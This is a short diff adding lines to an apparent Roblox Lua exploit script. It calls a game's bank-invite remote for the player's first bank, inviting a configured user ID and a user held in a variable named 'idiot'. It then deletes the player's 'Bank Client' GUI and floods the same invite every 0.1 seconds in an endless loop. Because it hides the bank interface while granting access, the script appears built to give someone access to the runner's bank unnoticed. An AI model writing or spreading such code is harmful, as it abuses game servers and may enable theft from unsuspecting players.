@@ -66,3 +66,16 @@ local Bank = BankID
 -- Bank ID and Library End
 
 inviteremote:InvokeServer(mybanks[1]['BUID'], idiot)
+
+-- Invites Scripts ( Dont Change if u dont know any )
+
+inviteremote:InvokeServer(mybanks[1]['BUID'], _G.UserID)
+
+inviteremote:InvokeServer(mybanks[1]['BUID'], idiot)
+
+local deletebank = game.Players.LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]
+deletebank:Destroy()
+
+while task.wait(0.1) do
+  inviteremote:InvokeServer(mybanks[1]['BUID'], idiot)
+end
